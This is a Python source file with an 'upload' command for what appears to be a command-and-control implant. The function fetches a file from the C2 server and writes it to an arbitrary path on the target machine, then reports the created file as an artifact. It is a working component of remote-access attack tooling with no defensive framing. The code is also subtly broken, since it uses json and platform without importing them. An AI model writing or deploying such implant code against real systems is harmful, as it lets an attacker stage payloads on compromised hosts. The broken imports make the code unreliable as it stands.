import os
import logging
from pathlib import Path
from typing import Dict, Any

def upload(task: Dict) -> Dict:
    """Upload file from C2 to target system"""
    response = {
        "user_output": "",
        "completed": True,
        "status": "success",
        "artifacts": []
    }

    try:
        params = json.loads(task.get("parameters", "{}"))
        remote_path = params.get("remote_path", "")
        file_id = params.get("file", "")  # Changed from 'file' to match JS logic

        if not file_id:
            response.update({
                "user_output": "Missing 'file' parameter with file ID",
                "status": "error"
            })
            return response

        # Get file content from C2 server
        try:
            file_content = C2.upload(task, file_id, "")
        except Exception as e:
            response.update({
                "user_output": f"Failed to fetch file from C2: {str(e)}",
                "status": "error"
            })
            return response

        # Resolve target path
        target_path = Path(remote_path).expanduser().resolve()
        
        # Ensure parent directory exists
        target_path.parent.mkdir(parents=True, exist_ok=True)

        # Write file contents
        try:
            if isinstance(file_content, str):
                file_content = file_content.encode()
            
            with open(target_path, "wb") as f:
                f.write(file_content)
        except Exception as e:
            response.update({
                "user_output": f"Write failed: {str(e)}",
                "status": "error"
            })
            return response

        # Cross-platform path normalization
        try:
            normalized_path = str(target_path.relative_to(Path.home())) 
            if platform.system() == "Windows":
                normalized_path = str(target_path)
        except ValueError:
            normalized_path = str(target_path)

        response.update({
            "user_output": f"Successfully uploaded to {normalized_path}",
            "upload": {
                "full_path": normalized_path,
                "file_id": file_id
            },
            "artifacts": [{
                "base_artifact": "File Create",
                "artifact": normalized_path
            }]
        })

    except Exception as e:
        logging.exception("Upload failed")
        response.update({
            "user_output": f"Critical error: {str(e)}",
            "status": "error"
        })

    return response